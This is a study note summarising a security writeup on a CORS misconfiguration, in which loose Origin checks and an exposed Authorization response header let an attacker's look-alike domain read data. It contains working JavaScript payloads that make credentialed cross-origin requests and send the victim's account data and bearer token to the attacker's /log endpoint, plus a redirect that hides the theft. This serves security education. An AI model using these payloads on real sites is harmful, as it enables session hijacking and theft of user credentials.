# Writeup - Fun With CORS

- writeup can be found at [this](https://web.archive.org/web/20230607084416/https://www.whiteoaksecurity.com/blog/fun-with-cors/) link


- This writeup was provided by __Talis Ozols__, you can read more of him [here](https://blog.cyberadvisors.com/technical-blog/author/talis-ozols)

<br>
<br>

#### CORS

- relaxation for SOP

- API, inter-app-communitcations: example payment gateways

<br>

#### Authentication Bearer vs Cookies

- Bearer: prevents CSRF

- Cookies: prevents XSS stealing with `HttpOnly` and `Secure=Lax`

<br>

#### Access-Control-Expose-Headers

- reading material [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Expose-Headers)

- allows a server to indicate which response headers should be made available to scripts running in the browser in response to a cross-origin request.


<br>

## Description

- This is a writeup about CORS misconfiguration, as well as misconfiguration in managing HTTP authentication headers.

- This showcases a classic case that arises due to lack of proper __wildcards__ and __Origin header__ validation

<br>
<br>

## Details

- During the analysis of the captured requests in _BurpSuite_, the researcher found some unique headers.

![conf](https://web.archive.org/web/20230607084416im_/https://lh3.googleusercontent.com/LaKpoPvp_pwvRYs-afJGx7fVyCPLF0bZXY39kGctZ2JpzClx5rUTsFSw7KDmlmR4fuosWvOz91BD382Wvdx3v4K-nMowV2kicsiIAxTRYuSTxoYhksRFkT2kGKZ354Dd6rLOUqe2Il-hwy6gReWX8ArVBA7T806KKlE0ODrefD3Wwpo1eqSEouoMyg)

<br>

#### Findings

- The following information can be established after looking at the headers:

1. Appliction restricts the `Access-Control-Allow-*` headers to subdomains of the main app.

2. if the main domain is `https://contosoapp.com`, then an __Origin__ of `https://test.contosoapp.com` will be accepted.

<br>

![example](https://web.archive.org/web/20230607084416im_/https://lh6.googleusercontent.com/ikZskxeEZ4av_8b-6obq36WypLABPhOix7oBe411GvC4k1T7jAJuvOro2UOsiuw5vqVkyQm-yHwOX5WprWjjtDR3Y3J3312UZxjqDeyxXcLGwOkXG2JfRoaFXWJ7G_You33SdoztfiW6TBqKVqC6qKmfyletG9KntKyZ63cSCV93uO2OYqUe3GFlfw)

3. The Application specifies `Acces-Control-Allow-Credentials: true`. Which means request from a valid origin will also be accepted for authorization and actions that require identity tokens.

4. An __`Authorizaion: Bearer`__ header can be seen with all the requests.

5.  The `Access-Control-Expose-Headers` directive included the __Authorization__ header.

```
Access-Control-Expose-Headers: Authorization, Set-Cookie
```
<br>
<br>


## Next Steps

- with a little bit of testing, it was found that due to lack of proper `Origin` header validation an Origin like:

```
https://whiteoakconsotoapp.com
```

- is also allowed with the _CORS_ headers

![view](https://web.archive.org/web/20230607084416im_/https://lh6.googleusercontent.com/tUHBm9-I7JOlnJCO6YGs76zdDNDOD7UeGO_0gQmBe8nVxxVlbg9fscK1atj-vg5ehusNrW8djDafyCp8TIXla0KY7Sn5PuJIBzqNgCA1o89h1ofe8jt_IPmPanx774R3tq4n4vmQhvey7mga9jXklG3tvaVp5KIb_CryvK5KSkiQ_SAxfMAJtFKGqQ)


- so the researcher purchased the valid domain, got an free SSL/TLS certificate with Let's Encrypt and spun up a server.

- The Attacker controlled website now did the following:


```javascript
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open("GET", "https://api.contosoapp.com/v2/getAccountNumber ", true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='/log?resp='+this.responseText;
   };
</script>
```

- so if an authenticated victim visits this page, the Javascript above will make a request on their behalf.

- valid coz of `Acces-Control-Allow-Credentials`

- so we can kind of piggyback on top of all those authentication headers.

- But this still doesn't give us the ability to get access to the __Authentication__ tokens, specifically the __Authorization Bearer__ here.


<br>
<br>

## Taking over the session

- we can see from the screenshots above that the `Authorization` header is being sent as a response as well.

- since `Access-Control-Expose-Headers: Authorization` is being set, then that means CORS can access the `Authorization` header.

- While CORS doesnt allow you to read the __REQUEST HEADERS__, but CORS lets you read the __REPONSE HEADERS__ and __REPONSE BODY__


- below is extneded functionality of the Attacker controlled page:

```js
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open("GET", "https://api.contosoapp.com/v2/settings", true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       var authHeader = req.getResponseHeader('Authorization');
       location='/log?key='+authHeader;
   };   };
</script>
```

- After visting the end point:

```
https://api.contosoapp.com/v2/settings
```

- the script can retrieve the `Authorization` header from response and sends the extracted token to `/log` endpoint


- The `/log` page simply redirects the targeted victim to main login page:

```html
<script>
window.onload = function() {
    location.href = 'https://contosoapp.com/login'
}
</script>
```

- We can see the extracted auth token has been retrieved:

![ey](https://web.archive.org/web/20230607084416im_/https://lh4.googleusercontent.com/yXKHsD5-0ODRu1qCZrPvmjPtfRo6g7SGyRWMDm6aZ91BjSvWgfvgf-Zwg1Js4wvPfMHYCZ4dmQE2eO2Sv45azpTGaKCVlMNZEjYPoQHBUxl-dB8O_vAil6HTqmoTtECHIp9F4ajZ8jb7NTVx31VwJ6srPxbiUhNySXiJt0IwZRVrtROgnCQ2QK_lLA)
